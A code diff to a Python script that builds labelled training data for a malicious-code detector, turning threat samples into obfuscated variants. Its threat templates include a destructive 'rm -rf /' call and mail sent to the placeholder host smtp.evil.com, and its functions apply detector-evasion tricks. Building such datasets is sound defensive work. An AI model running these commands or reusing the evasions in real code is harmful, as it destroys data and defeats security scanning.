@@ -1,11 +1,8 @@
 # adversarial_trainer.py
 import os
-import shutil
-from pathlib import Path
 import random
-import re
+from pathlib import Path
 
-# --- Base threat templates (from synthetic_generator.py) ---
 THREAT_TEMPLATES = [
     "import os\nos.system('rm -rf /')",
     "import subprocess\nsubprocess.Popen(['python', '-c', 'import os; os.system(\"calc\")'])",
@@ -19,7 +16,6 @@ THREAT_TEMPLATES = [
     "import smtplib\nsmtp = smtplib.SMTP('smtp.evil.com')\nsmtp.sendmail('a@a.com', 'b@b.com', 'malicious')",
 ]
 
-# --- Safe templates ---
 SAFE_TEMPLATES = [
     "import math\ndef calculate(x):\n    return math.sqrt(x) + math.pi\nprint(calculate(10))",
     "import json\ndata = {'name': 'test'}\nwith open('data.json', 'w') as f:\n    json.dump(data, f)",
@@ -28,17 +24,12 @@ SAFE_TEMPLATES = [
     "import collections\ncounter = collections.Counter(['a','b','a'])\nprint(counter)",
 ]
 
-# --- Obfuscation functions (from adversarial_test.py) ---
 def obfuscate_py(code):
     """Apply common Python obfuscations."""
-    # 1. getattr evasion
     code = code.replace('os.system', 'getattr(os, "system")')
-    # 2. String concatenation
     code = code.replace('"system"', '"sys" + "tem"')
     code = code.replace("'system'", "'sys' + 'tem'")
-    # 3. __import__ evasion
     code = code.replace('import os', 'os = __import__("os")')
-    # 4. Variable renaming
     code = code.replace('os', 'o')
     return code
 
@@ -49,17 +40,17 @@ def mutate_code(code):
         lambda s: s.replace('eval', 'ev' + 'al'),
         lambda s: s.replace('system', 'syst' + 'em'),
         lambda s: s.replace('import', '_import_'),
+        lambda s: s.replace('chr', 'ch' + 'r'),
     ]
     for _ in range(random.randint(1, 3)):
         code = random.choice(mutations)(code)
     return code
 
-def generate_adversarial_training_data(safe_dir="training_data/safe", threat_dir="training_data/threat", num_variants=20):
-    """Generate and add adversarial variants to the training data."""
+def generate_adversarial_training_data(safe_dir="training_data/safe", threat_dir="training_data/threat", num_variants=30):
     os.makedirs(safe_dir, exist_ok=True)
     os.makedirs(threat_dir, exist_ok=True)
     
-    # Add safe variants
+    # Add safe templates
     for i, template in enumerate(SAFE_TEMPLATES):
         with open(os.path.join(safe_dir, f"adv_safe_{i+1}.py"), 'w') as f:
             f.write(template)
@@ -69,10 +60,10 @@ def generate_adversarial_training_data(safe_dir="training_data/safe", threat_dir
         with open(os.path.join(threat_dir, f"threat_{i+1}.py"), 'w') as f:
             f.write(template)
     
-    # Add adversarial variants of threats
+    # Add adversarial variants
     adv_count = 0
     for template in THREAT_TEMPLATES:
-        for _ in range(2):
+        for _ in range(num_variants // len(THREAT_TEMPLATES) + 1):
             variant = obfuscate_py(template)
             variant = mutate_code(variant)
             adv_count += 1
